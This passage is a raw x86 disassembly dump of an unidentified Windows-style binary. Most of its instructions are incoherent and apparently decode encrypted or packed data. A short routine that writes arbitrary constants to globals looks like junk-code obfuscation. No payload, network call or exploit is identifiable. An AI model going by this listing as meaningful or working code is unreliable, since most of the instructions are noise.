  4061eb:	xchg   esp,eax
  4061ec:	data16 aam 0x1f
  4061ef:	in     al,0x63
  4061f1:	pop    edi
  4061f2:	scas   eax,DWORD PTR es:[edi]
  4061f3:	mov    al,0xa6
  4061f5:	neg    BYTE PTR [edx+0x113ad7ee]
  4061fb:	or     eax,0x4495b686
  406200:	sub    DWORD PTR [ecx+0x3002c801],ecx
  406206:	xchg   BYTE PTR [esi],dh
  406208:	cld    
  406209:	xchg   esp,eax
  40620a:	cmp    DWORD PTR [esi+0x54],0x15
  40620e:	jnp    0x406193
  406210:	mov    WORD PTR [eax+0x23],ds
  406213:	dec    edi
  406214:	mov    ds:0x9695a4d8,eax
  406219:	dec    esi
  40621a:	add    al,0x8a
  40621c:	dec    esp
  40621d:	pmulhw mm1,QWORD PTR [eax]
  406220:	js     0x4061e8
  406222:	dec    ecx
  406223:	sub    al,bl
  406225:	pop    es
  406226:	test   al,0x90
  406228:	mov    ?,edx
  40622a:	mov    DWORD PTR [ecx],0xfcebe12
  406230:	or     ah,BYTE PTR [eax]
  406232:	push   cs
  406233:	or     eax,0x9cbfb051
  406238:	in     al,0x4
  40623a:	mov    dl,dh
  40623c:	xor    DWORD PTR [ecx-0x5904eebc],ebx
  406242:	jecxz  0x406257
  406244:	stc    
  406245:	push   cs
  406246:	out    0xb2,al
  406248:	dec    ecx
  406249:	mov    cl,0x73
  40624b:	and    ebx,edx
  40624d:	dec    dh
  40624f:	and    DWORD PTR [edi+0x4b],eax
  406252:	fnsave [ebp-0x46]
  406255:	in     eax,dx
  406256:	js     0x4062bd
  406258:	pop    ecx
  406259:	adc    ah,bh
  40625b:	push   0xc61e42bb
  406260:	test   DWORD PTR [edi],0xd4d23fa8
  406266:	popa   
  406267:	ja     0x406273
  406269:	inc    edx
  40626a:	jl     0x4062bb
  40626c:	xor    esi,0x7f
  40626f:	daa    
  406270:	sub    dl,bl
  406272:	bound  esi,QWORD PTR [ecx-0x36]
  406275:	outs   dx,BYTE PTR ds:[esi]
  406276:	jp     0x406277
  406278:	xor    eax,0xe9df795c
  40627d:	xchg   ecx,eax
  40627e:	out    dx,al
  40627f:	daa    
  406280:	inc    edx
  406281:	test   al,0x45
  406283:	mov    dl,0xcf
  406285:	hlt    
  406286:	imul   ecx,DWORD PTR [edi],0x1c
  406289:	fld    TBYTE PTR [eax]
  40628b:	pop    es
  40628c:	add    BYTE PTR ds:0xe90c0e3,0x75
  406293:	pop    ss
  406294:	daa    
  406295:	and    eax,0x78c5e95
  40629a:	dec    edi
  40629b:	fsubp  st(1),st
  40629d:	mov    edi,0xf3fd5d94
  4062a2:	add    al,0xf8
  4062a4:	shl    BYTE PTR [ebx],1
  4062a6:	add    eax,0x2e5a50d0
  4062ab:	mov    ecx,0xfbaaff83
  4062b0:	icebp  
  4062b1:	ss add ch,ah
  4062b4:	in     al,0x96
  4062b6:	add    DWORD PTR [ecx+0x150737a2],edx
  4062bc:	add    ecx,DWORD PTR [edi+0x26]
  4062bf:	int    0xa6
  4062c1:	sub    ebx,DWORD PTR [edx-0x59]
  4062c4:	sub    DWORD PTR [ecx+0x43],ecx
  4062c7:	inc    esp
  4062c8:	pop    ecx
  4062c9:	fwait
  4062ca:	mov    ecx,edx
  4062cc:	mov    ch,0x1
  4062ce:	icebp  
  4062cf:	add    eax,DWORD PTR [ebp-0x6a]
  4062d2:	adc    DWORD PTR [esi-0x3d],esi
  4062d5:	push   esp
  4062d6:	adc    DWORD PTR [ebx+0x22],ebp
  4062d9:	into   
  4062da:	add    DWORD PTR [esi-0x2be60a99],esp
  4062e0:	sbb    DWORD PTR [edx+edx*1-0x5f557d9c],ebx
  4062e7:	out    0xc2,al
  4062e9:	cmp    al,0xe
  4062eb:	fadd   DWORD PTR [edi-0x42]
  4062ee:	call   FWORD PTR cs:[eax+0x54]
  4062f2:	sub    cl,bl
  4062f4:	ror    BYTE PTR [edi-0x45],1
  4062f7:	mov    ch,BYTE PTR [esi+0x29fb0790]
  4062fd:	popa   
  4062fe:	xor    BYTE PTR [edi+0x7f96045c],dl
  406304:	arpl   WORD PTR [edi],bp
  406306:	cmp    eax,0xa34b9682
  40630b:	pop    eax
  40630c:	pop    eax
  40630d:	and    al,0x4e
  40630f:	out    dx,al
  406310:	(bad)  
  406311:	mov    ebx,0xc038aaae
  406316:	pop    ecx
  406317:	sub    bh,cl
  406319:	dec    ecx
  40631a:	(bad)  
  40631b:	into   
  40631c:	in     eax,0x9c
  40631e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40631f:	call   0xb3bb8bc8
  406324:	stos   BYTE PTR es:[edi],al
  406325:	xor    cl,0xbf
  406328:	cmp    BYTE PTR [edx],ch
  40632a:	and    dl,BYTE PTR ds:0x6fc14537
  406330:	jae    0x406381
  406332:	pop    ecx
  406333:	inc    ecx
  406334:	ins    DWORD PTR es:[edi],dx
  406335:	aas    
  406336:	and    BYTE PTR [eax-0x2565cb68],al
  40633c:	mov    cl,0x9b
  40633e:	sahf   
  40633f:	mov    bh,0x86
  406341:	test   BYTE PTR [edx-0x3],0xef
  406345:	add    DWORD PTR cs:[esp+edi*1-0x54634a6b],ecx
  40634d:	sub    DWORD PTR [edi-0x9],esi
  406350:	push   ebp
  406351:	sti    
  406352:	pop    esp
  406353:	cmp    edx,ebp
  406355:	mov    edi,0x728e8036
  40635a:	retf   0xf745
  40635d:	test   BYTE PTR [ebx-0xa],dh
  406360:	in     eax,dx
  406361:	loop   0x40637d
  406363:	push   eax
  406364:	cmp    al,0xeb
  406366:	adc    BYTE PTR [edi+0x14b268b5],ch
  40636c:	push   edi
  40636d:	jno    0x40630c
  40636f:	mov    edx,0xd484edbc
  406374:	pop    esi
  406375:	mov    al,BYTE PTR [ebx+0x46b92e0a]
  40637b:	fsubr  DWORD PTR [ebx+0x69]
  40637e:	sub    ebx,ecx
  406380:	mov    dh,BYTE PTR [eax-0x23a7831e]
  406386:	ret    0xd20c
  406389:	je     0x406391
  40638b:	cdq    
  40638c:	lods   al,BYTE PTR ds:[esi]
  40638d:	fiadd  WORD PTR [ecx-0x1b]
  406390:	sub    eax,0x2615dccf
  406395:	ja     0x40634d
  406397:	jle    0x4063ec
  406399:	lea    edi,[edi-0x60]
  40639c:	stos   BYTE PTR es:[edi],al
  40639d:	push   ebp
  40639e:	pop    es
  40639f:	neg    BYTE PTR [edx+eiz*1+0x6e]
  4063a3:	mov    ah,0x3f
  4063a5:	dec    ecx
  4063a6:	mov    ecx,0xb4f00e2b
  4063ab:	int    0xbc
  4063ad:	pop    es
  4063ae:	int    0x91
  4063b0:	adc    eax,0xd538d0c0
  4063b5:	mov    eax,ds:0xf2a248a6
  4063ba:	sar    DWORD PTR [esi],cl
  4063bc:	div    DWORD PTR [esi-0x116a0afb]
  4063c2:	sbb    BYTE PTR [edi-0x5a],al
  4063c5:	sbb    eax,0xd7e5bfe1
  4063ca:	mov    dl,0x79
  4063cc:	js     0x40639f
  4063ce:	add    eax,0x6f21041
  4063d3:	pop    esp
  4063d4:	pushf  
  4063d5:	jg     0x406387
  4063d7:	aas    
  4063d8:	inc    edx
  4063d9:	cmp    BYTE PTR [ebp-0x50],0x1f
  4063dd:	shl    DWORD PTR [edx-0x447fa04],0x48
  4063e4:	retf   0xa8c7
  4063e7:	stos   BYTE PTR es:[edi],al
  4063e8:	ins    DWORD PTR es:[edi],dx
  4063e9:	inc    esi
  4063ea:	rcr    al,0x20
  4063ed:	(bad)  
  4063ee:	mov    edi,0xe0d9eb9c
  4063f3:	mov    esi,0xd824ef34
  4063f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063f9:	inc    ebx
  4063fa:	out    dx,al
  4063fb:	jae    0x4063dc
  4063fd:	xor    eax,0xc8dc2e41
  406402:	(bad)  
  406404:	jae    0x4063ba
  406406:	popa   
  406407:	xchg   ebx,eax
  406408:	mov    edx,0x2fd443da
  40640d:	aaa    
  40640e:	sub    eax,0x2612b38f
  406413:	mov    ah,0x5c
  406415:	(bad)  
  406416:	icebp  
  406417:	jp     0x406429
  406419:	call   0x2b3da97b
  40641e:	ret    0x8be9
  406421:	jbe    0x405c26
  406427:	pop    ebx
  406428:	mov    eax,0xf89c8532
  40642d:	pop    edi
  40642e:	pop    esi
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430486,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e762
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430492
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x4304b2,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ee0c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e762,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e75a
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8-0x792a8213]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	xchg   edx,eax
  4064ae:	aaa    
  4064af:	in     al,0x96
  4064b1:	shl    BYTE PTR ds:[esi+0x75469bde],0x2f
  4064b9:	fs (bad) 
  4064bb:	jmp    0x7df4df74
  4064c0:	mov    ds:0x38ae5403,eax
  4064c5:	and    eax,DWORD PTR [ecx+0x5b]
  4064c8:	pop    esi
  4064c9:	icebp  
  4064ca:	dec    eax
  4064cb:	ds icebp 
  4064cd:	add    ah,bh
  4064cf:	mov    bh,0xbf
  4064d1:	xchg   esi,eax
  4064d2:	inc    ebx
  4064d3:	call   0xc873:0x202532eb
  4064da:	push   0x46a71051
  4064df:	mov    dl,0x7f
  4064e1:	stos   BYTE PTR es:[edi],al
  4064e2:	mov    ecx,0x5835333b
  4064e7:	adc    edi,DWORD PTR [ebx-0x24]
  4064ea:	push   eax
  4064eb:	pop    esi
  4064ec:	add    bh,BYTE PTR [ebp+ebx*4-0x1e]
  4064f0:	rcl    DWORD PTR [ebx],0x89
  4064f3:	(bad)  
  4064f4:	fadd   QWORD PTR [edx+0x11cd0cb0]
  4064fa:	jb     0x406489
  4064fc:	mov    cl,0xab
  4064fe:	test   edi,0xc2e29dd8
  406504:	add    eax,0xe88cecdb
  406509:	arpl   WORD PTR [ecx],dx
  40650b:	and    DWORD PTR [edx-0x2e],eax
  40650e:	fist   WORD PTR [ecx]
  406510:	ficomp DWORD PTR [ebx]
  406512:	iret   
  406513:	push   0x12
  406515:	dec    eax
  406516:	(bad)  
  406517:	fst    DWORD PTR [ecx]
  406519:	pop    ss
  40651a:	call   0xcb16c860
  40651f:	pop    ss
  406520:	mov    ebp,edi
  406522:	mov    ch,BYTE PTR [ebx]
  406524:	aaa    
  406525:	into   
  406526:	(bad)  
  406527:	push   ds
  406528:	loopne 0x406504
  40652a:	fs xchg edi,eax
  40652c:	(bad)  
  40652d:	out    dx,eax
  40652e:	cmp    al,BYTE PTR [esp+eax*8]
  406531:	test   BYTE PTR [edi-0x32786016],bh
  406537:	fisub  WORD PTR [ecx+ebp*4]
  40653a:	inc    esi
  40653b:	outs   dx,BYTE PTR ds:[esi]
  40653c:	mov    eax,ds:0x8518f962
  406541:	mov    al,0x57
  406543:	and    al,0x4c
  406545:	cs push edi
  406547:	jp     0x4065a2
  406549:	push   es
  40654a:	mov    ch,0x17
  40654c:	inc    eax
  40654d:	add    BYTE PTR [edi+esi*1],bl
  406550:	lods   al,BYTE PTR ds:[esi]
  406551:	or     al,0xf4
  406553:	fsubr  QWORD PTR [ebx+0x758d9b8f]
  406559:	mov    cs,WORD PTR [ebp-0xa]
  40655c:	(bad)  
  40655d:	sti    
  40655e:	(bad)  
  40655f:	mov    esi,0x8f7ace6e
  406564:	and    DWORD PTR cs:[ebx+0x6a02cf18],0xeed6178f
  40656f:	sahf   
  406570:	mov    ?,WORD PTR [edi]
  406572:	out    dx,al
  406573:	sub    bh,ah
  406575:	ss push eax
  406577:	(bad)  
  406578:	in     eax,dx
  406579:	dec    ebp
  40657a:	dec    ecx
  40657b:	adc    al,0xe7
  40657d:	sbb    al,0xb9
  40657f:	leave  
  406580:	ret    0x3f57
  406583:	sbb    BYTE PTR [eax-0x2a],0xe7
  406587:	mov    ebp,0xd4aa97e
  40658c:	xchg   ebx,eax
  40658d:	xchg   al,cl
  40658f:	scas   al,BYTE PTR es:[edi]
  406590:	fld    DWORD PTR [ebx]
  406592:	dec    edi
  406593:	push   esp
  406594:	jecxz  0x4065a1
  406596:	out    dx,eax
  406597:	imul   esp,DWORD PTR [edx],0x4d28399a
  40659d:	sbb    BYTE PTR [ebx-0x341d644f],al
  4065a3:	dec    ebx
  4065a4:	add    ah,BYTE PTR [edx+0x1d]
  4065a7:	or     al,0x8e
  4065a9:	addr16 inc esi
  4065ab:	sbb    BYTE PTR [ebx],0xe4
  4065ae:	inc    ecx
  4065af:	fild   DWORD PTR [ebx-0x31]
  4065b2:	imul   ebx,DWORD PTR [ecx-0x75],0xffffffa3
  4065b6:	push   eax
  4065b7:	aas    
  4065b8:	fnstenv [ecx]
  4065ba:	fdiv   QWORD PTR [ecx+eax*4+0x22678e41]
  4065c1:	fisubr DWORD PTR [esi]
  4065c3:	mov    dh,0x2b
  4065c5:	je     0x406584
  4065c7:	leave  
  4065c8:	scas   eax,DWORD PTR es:[edi]
  4065c9:	(bad)  
  4065ca:	xchg   ebp,eax
  4065cb:	sub    esp,DWORD PTR [ebp+0x6d9ceb1b]
  4065d1:	or     ebp,edi
  4065d3:	outs   dx,BYTE PTR ds:[esi]
  4065d4:	lea    ebx,[edi-0x55]
  4065d7:	inc    ebx
  4065d8:	mov    ch,0x81
  4065da:	push   ss
  4065db:	loopne 0x4065f2
  4065dd:	push   edi
  4065de:	inc    esp
  4065df:	adc    DWORD PTR [ebx],ebx
  4065e1:	in     eax,0x49
  4065e3:	out    dx,eax
  4065e4:	(bad)  
  4065e5:	out    0x27,eax
  4065e7:	jo     0x406645
  4065e9:	out    0xbd,al
  4065eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065ec:	cwde   
  4065ed:	sbb    ebp,DWORD PTR [ebx+0x307788a1]
  4065f3:	cmp    eax,0x63633c6d
  4065f8:	jo     0x4065f9
  4065fa:	adc    ah,ch
  4065fc:	jne    0x4065fc
  4065fe:	test   ecx,eax
  406600:	adc    edi,DWORD PTR [eax]
  406602:	fild   QWORD PTR [esi+0x3303053b]
  406608:	jle    0x40658d
  40660a:	cmp    esp,DWORD PTR [esi+0x70c7adba]
  406610:	xor    ebx,DWORD PTR [eax+0x45]
  406613:	xchg   ebp,eax
  406614:	mov    ebx,0xd6cb81b0
  406619:	(bad)  
  40661a:	lock sbb al,0x7d
  40661d:	jp     0x4065e4
  40661f:	inc    ecx
  406620:	cdq    
  406621:	ss (bad) 
  406623:	mov    edi,0x7534d2c8
  406628:	and    edx,DWORD PTR [edx-0x1a]
  40662b:	add    al,0xfd
  40662d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40662e:	or     ch,dl
  406630:	add    eax,0x641cb437
  406635:	sub    edi,DWORD PTR [ecx-0x1c99560d]
  40663b:	pop    esi
  40663c:	mov    dh,0x95
  40663e:	sub    eax,0x22792222
  406643:	rol    DWORD PTR [ecx-0x642b7830],1
  406649:	fwait
  40664a:	scas   al,BYTE PTR es:[edi]
  40664b:	mov    ds:0xb7b2fe57,eax
  406650:	dec    ecx
  406651:	std    
  406652:	adc    BYTE PTR [bp+di],bl
  406655:	daa    
  406656:	xchg   edi,eax
  406657:	jnp    0x406694
  406659:	rol    DWORD PTR [edi],cl
  40665b:	mov    ebx,0x800256b6
  406660:	stos   BYTE PTR es:[edi],al
  406661:	neg    al
  406663:	popf   
  406664:	and    DWORD PTR [ecx-0x37862c0b],ebp
  40666a:	push   edx
  40666b:	ret    0xf901
  40666e:	lods   eax,DWORD PTR ds:[esi]
  40666f:	(bad)  [ebx-0x5c4a98ca]
  406675:	mov    ecx,0xe1ae1189
  40667a:	sbb    eax,DWORD PTR [edx+0x67fc66b2]
  406680:	xchg   ecx,eax
  406681:	pop    esi
  406682:	and    BYTE PTR [edx],al
  406684:	dec    BYTE PTR [eax-0x6441cf9b]
  40668a:	ss mov ecx,0x2de6bd37
  406690:	sar    DWORD PTR [edx],cl
  406692:	nop
  406693:	ret    
  406694:	rcr    ecx,cl
  406696:	(bad)  
  406697:	xlat   BYTE PTR ds:[ebx]
  406698:	and    BYTE PTR [ecx-0xe],al
  40669b:	leave  
  40669c:	leave  
  40669d:	push   ss
  40669e:	xor    DWORD PTR ds:0xb7ab9ef2,ebx
  4066a4:	rcl    dh,cl
  4066a6:	ffreep st(5)
  4066a8:	mov    cl,0x77
  4066aa:	push   ebp
  4066ab:	pop    ss
  4066ac:	test   BYTE PTR [ebx-0x24],ah
  4066af:	dec    esi
  4066b0:	adc    ebp,DWORD PTR ds:0x8280fdf1
  4066b6:	sahf   
  4066b7:	int3   
  4066b8:	jb     0x4066f5
  4066ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066bb:	fsin   
  4066bd:	ds jl  0x406696
  4066c0:	xchg   esp,eax
  4066c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066c2:	jge    0x406714
  4066c4:	pop    ecx
  4066c5:	dec    DWORD PTR [ecx-0x74]
  4066c8:	in     al,dx
  4066c9:	lods   eax,DWORD PTR ds:[esi]
  4066ca:	fnsave [ebx]
  4066cc:	test   eax,0xfa99abeb
  4066d1:	ja     0x406653
  4066d3:	div    BYTE PTR [ecx+0x2edd0a2c]
  4066d9:	sahf   
  4066da:	icebp  
  4066db:	test   cl,bh
  4066dd:	int3   
  4066de:	jmp    0xe48b:0xb48c0be1
  4066e5:	mov    ah,0x8a
  4066e7:	pop    esi
  4066e8:	push   edx
  4066e9:	out    0x23,al
  4066eb:	lahf   
  4066ec:	fs daa 
  4066ee:	push   edi
  4066ef:	xchg   esp,eax
  4066f0:	(bad)  
  4066f1:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4066f3:	fwait
  4066f4:	out    dx,al
  4066f5:	dec    ebp
  4066f6:	dec    ecx
  4066f7:	leave  
  4066f8:	call   0x6998:0xa57bae2f
  4066ff:	sbb    DWORD PTR [edx-0x6c],0x6d8b7e0e
  406706:	inc    ecx
  406707:	xchg   esi,eax
  406708:	int3   
  406709:	cli    
  40670a:	pop    esi
  40670b:	scas   al,BYTE PTR es:[edi]
  40670c:	add    al,0xa4
  40670e:	ins    BYTE PTR es:[edi],dx
  40670f:	scas   eax,DWORD PTR es:[edi]
  406710:	dec    ebp
  406711:	dec    edx
  406712:	iret   
  406713:	dec    ebx
  406714:	(bad)  
  406715:	mov    al,ds:0x664e90d5
  40671a:	dec    ebp
  40671b:	mov    bh,0xae
  40671d:	mov    eax,ds:0xb35f0fe3
  406722:	sub    BYTE PTR [ebp+0xbdfa7a],al
  406728:	and    ah,BYTE PTR [esi-0xb]
  40672b:	push   0xffffffba
  40672d:	dec    edi
  40672e:	sub    al,0x5f
  406730:	inc    esi
  406731:	repnz (bad) 
  406733:	shl    BYTE PTR [ebx-0x29bea615],1
  406739:	loop   0x406736
  40673b:	cmp    ah,BYTE PTR [edx-0x62]
  40673e:	cmp    DWORD PTR es:[ebp+0x60],0x6a
  406743:	inc    ebx
  406744:	xor    al,BYTE PTR [eax+edx*2]
  406747:	add    DWORD PTR [ebp+0x263c1a1e],edi
  40674d:	stos   DWORD PTR es:[edi],eax
  40674e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40674f:	push   esi
  406750:	ss ret 
  406752:	neg    DWORD PTR [ecx]
  406754:	jp     0x4067bd
  406756:	sub    al,BYTE PTR [edx-0x1b]
  406759:	jle    0x4067c7
  40675b:	mov    BYTE PTR gs:[edi+0x73],ah
  40675f:	fmul   DWORD PTR [esi+0x480d916c]
  406765:	sub    edi,edi
  406767:	das    
  406768:	sub    BYTE PTR [ecx],bl
  40676a:	in     eax,0x52
  40676c:	mov    eax,0x6e273286
  406771:	loop   0x406763
  406773:	add    BYTE PTR [esi-0xc],ah
  406776:	test   BYTE PTR [ebx-0x80],dl
  406779:	sahf   
  40677a:	scas   eax,DWORD PTR es:[edi]
  40677b:	add    BYTE PTR [ebp+0x1a1ef607],ch
  406781:	std    
  406782:	stos   BYTE PTR es:[edi],al
  406783:	xor    BYTE PTR [ebx],dl
  406785:	add    DWORD PTR [ebx],esi
  406787:	icebp  
  406788:	dec    ebx
  406789:	clc    
  40678a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40678b:	jbe    0x40676e
  40678d:	ja     0x40671f
  40678f:	push   ecx
  406790:	inc    esp
  406791:	aad    0xed
  406793:	sahf   
  406794:	loope  0x4067b3
  406796:	loopne 0x406769
  406798:	push   ss
  406799:	xlat   BYTE PTR ds:[ebx]
  40679a:	sub    al,0xf8
  40679c:	into   
  40679d:	dec    esi
  40679e:	push   ds
  40679f:	imul   edx,DWORD PTR [ecx-0x20],0xffffffcf
  4067a3:	push   0x16bf9eb4
  4067a8:	push   esp
  4067a9:	cmp    DWORD PTR [esi+0x701bebd7],esi
  4067af:	xchg   esp,eax
  4067b0:	jecxz  0x4067d0
  4067b2:	push   eax
  4067b3:	jne    0x406768
  4067b5:	sub    eax,DWORD PTR [ecx+0x2e]
  4067b8:	pop    ds
  4067b9:	sub    eax,0x301dbf93
  4067be:	inc    eax
  4067bf:	add    DWORD PTR [edx+0x12a210d7],ecx
  4067c5:	push   0xffffffcb
  4067c7:	test   BYTE PTR [ebp-0x47],cl
  4067ca:	sti    
  4067cb:	lds    ebx,FWORD PTR [ebx+0x40719218]
  4067d1:	xchg   BYTE PTR [edx+eax*1],al
  4067d4:	fild   DWORD PTR [ebp+0x32dbd3ef]
  4067da:	or     al,0x6a
  4067dc:	xor    bh,bl
  4067de:	sub    BYTE PTR [ebp-0x6f],ch
  4067e1:	jno    0x406765
  4067e3:	ja     0x406862
  4067e5:	xchg   esi,eax
  4067e6:	push   ecx
  4067e7:	add    bh,0xe1
  4067ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067eb:	add    DWORD PTR [esp+eiz*4+0x28b14fa4],0x38
  4067f3:	imul   ebp,DWORD PTR [eax+0x5d957059],0x34e10bd
  4067fd:	mov    ebp,0x48646d9b
  406802:	(bad)  
  406803:	dec    DWORD PTR [edi+0x1]
  406806:	mov    ebx,0x91575fbf
  40680b:	push   ss
  40680c:	stos   BYTE PTR es:[edi],al
  40680d:	pop    es
  40680e:	push   esi
  40680f:	das    
  406810:	(bad)  
  406811:	repnz inc ebp
  406813:	jecxz  0x4067fe
  406815:	and    cl,BYTE PTR [edi-0x16]
  406818:	out    dx,al
  406819:	or     ecx,DWORD PTR [ebx+0x1d810c75]
  40681f:	and    al,0xee
  406821:	inc    edx
  406822:	add    BYTE PTR [edx+0x2b004304],ch
  406828:	ret    0xc133
  40682b:	mov    DWORD PTR ds:0x430552,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ee1c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x43053e
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x4304ba,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x430556,0x43049a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42ee24,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	dec    edx
  406894:	fs loope 0x406835
  406897:	dec    ebx
  406898:	ss jle 0x406919
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	xor    DWORD PTR [esi+0x31],esi
  4068a2:	xchg   edi,eax
  4068a3:	push   0xc
  4068a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068a6:	sbb    edx,ebp
  4068a8:	bound  ecx,QWORD PTR [ecx+0x15]
  4068ab:	adc    al,0xbe
  4068ad:	add    eax,0x73214c82
  4068b2:	jo     0x406848
  4068b4:	(bad)  
  4068b6:	in     al,dx
  4068b7:	or     BYTE PTR [ecx],dl
  4068b9:	call   0xebca:0xa1c20437
  4068c0:	les    esi,FWORD PTR [ebx-0x68]
  4068c3:	fcomip st,st(3)
  4068c5:	mov    edx,0x39812595
  4068ca:	jne    0x4068c6
  4068cc:	loopne 0x40689d
  4068ce:	adc    BYTE PTR [edx+0x2e],dh
  4068d1:	mov    ecx,0x6b3f60c0
  4068d6:	(bad)  
  4068d7:	outs   dx,DWORD PTR ds:[esi]
  4068d8:	pop    esi
  4068d9:	sub    al,0xab
  4068db:	xchg   edx,eax
  4068dc:	or     esi,DWORD PTR [edx+0x5adc92c]
  4068e2:	mov    edi,0xdf32cd59
  4068e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068e8:	mov    es,WORD PTR [ebp-0x2]
  4068eb:	call   0xa92adeba
  4068f0:	dec    BYTE PTR [esi+0x33b76a06]
  4068f6:	retf   0xa537
  4068f9:	xchg   bl,bl
  4068fb:	add    ah,BYTE PTR [edi+0x70c426e5]
  406901:	push   DWORD PTR [ebx+0x25]
  406904:	mov    al,ds:0xc9c53e98
  406909:	xchg   esp,eax
  40690a:	retf   0x6f15
  40690d:	adc    bh,BYTE PTR [ecx+0x4d2cccdf]
  406913:	sub    BYTE PTR [ebp+0x39f8ea3d],0x7
  40691a:	mov    edx,DWORD PTR [ecx+ebp*8]
  40691d:	inc    edi
  40691e:	out    dx,eax
  40691f:	mov    al,0xfc
  406921:	bound  esp,QWORD PTR [esi]
  406923:	mov    ds:0x3cce0d07,al
  406928:	xrelease xchg BYTE PTR [ecx-0x3cd5b27b],dl
  40692f:	ds aad 0x6
  406932:	js     0x406924
  406934:	pop    ebx
  406935:	or     BYTE PTR [eax-0x61],bh
  406938:	js     0x406980
  40693a:	mov    ebp,0xbc64b6a8
  40693f:	or     bl,BYTE PTR ds:0x6dfbb28c
  406945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406946:	dec    esi
  406947:	xchg   esp,eax
  406948:	mov    ecx,DWORD PTR ss:[ecx-0x64]
  40694c:	cs xchg ebp,eax
  40694e:	data16 ja 0x406902
  406951:	inc    eax
  406952:	sti    
  406953:	jo     0x4069a1
  406955:	mov    esp,0x28cf7d40
  40695a:	sbb    al,0x52
  40695c:	es ds xor ah,ch
  406960:	cmp    BYTE PTR [edi+0x17],0xcb
  406964:	sub    eax,0x359b9cc5
  406969:	rcr    BYTE PTR [esi+ebp*2+0x36409d0b],1
  406970:	and    eax,0x2fa2dc0f
  406975:	xor    BYTE PTR [ecx],bh
  406977:	xor    DWORD PTR [ebx-0x56],edi
  40697a:	push   0xfffffff1
  40697c:	dec    eax
  40697d:	in     eax,dx
  40697e:	sub    BYTE PTR [esi],0xc
  406981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406982:	mov    ds:0x9e4ffa20,al
  406987:	mov    esi,0x223355bc
  40698c:	jp     0x406932
  40698e:	popa   
  40698f:	lods   eax,DWORD PTR ds:[esi]
  406990:	imul   ebx,DWORD PTR [ebx],0x66
  406993:	repnz xchg ebp,eax
  406995:	retf   
  406996:	inc    esp
  406997:	sti    
  406998:	in     eax,0x81
  40699a:	inc    edi
  40699b:	push   0xffffffd7
  40699d:	mov    edi,0xffa075c6
  4069a2:	imul   edi,DWORD PTR ds:0xad444bcb,0xb0b77bf1
  4069ac:	dec    ecx
  4069ad:	push   esi
  4069ae:	and    cl,BYTE PTR [eax+0x52]
  4069b1:	sub    ah,BYTE PTR [esi-0x3710621a]
  4069b7:	sbb    DWORD PTR [edx+0x6060d949],ecx
  4069bd:	test   eax,0x6717b5f7
  4069c2:	scas   eax,DWORD PTR es:[edi]
  4069c3:	adc    ch,BYTE PTR [eax+ecx*8+0x58]
  4069c7:	lahf   
  4069c8:	lods   eax,DWORD PTR ds:[esi]
  4069c9:	(bad)  
  4069ca:	fnsave [esi-0x44]
  4069cd:	jp     0x406989
  4069cf:	push   esi
  4069d0:	jae    0x4069b0
  4069d2:	sub    eax,0x78f041a0
  4069d7:	push   esp
  4069d8:	lds    esp,FWORD PTR [eax+0x3a]
  4069db:	mov    edi,0x18e7a4b6
  4069e0:	pop    es
  4069e1:	inc    ebx
  4069e2:	mov    edi,ebx
  4069e4:	mov    cl,0x1b
  4069e6:	xor    eax,0xc2425dc2
  4069eb:	cmp    ebx,DWORD PTR [esi]
  4069ed:	add    ah,ch
  4069ef:	repz xor eax,0xb266f829
  4069f5:	inc    eax
  4069f6:	jmp    0xf2228e24
  4069fb:	jmp    0x4069ec
  4069fd:	jmp    0x6989ff54
  406a02:	js     0x406a80
  406a04:	mov    cl,0xd2
  406a06:	cwde   
  406a07:	outs   dx,BYTE PTR ds:[esi]
  406a08:	sub    ebx,0x42
  406a0b:	pushf  
  406a0c:	mov    al,0x91
  406a0e:	push   edx
  406a0f:	pop    ecx
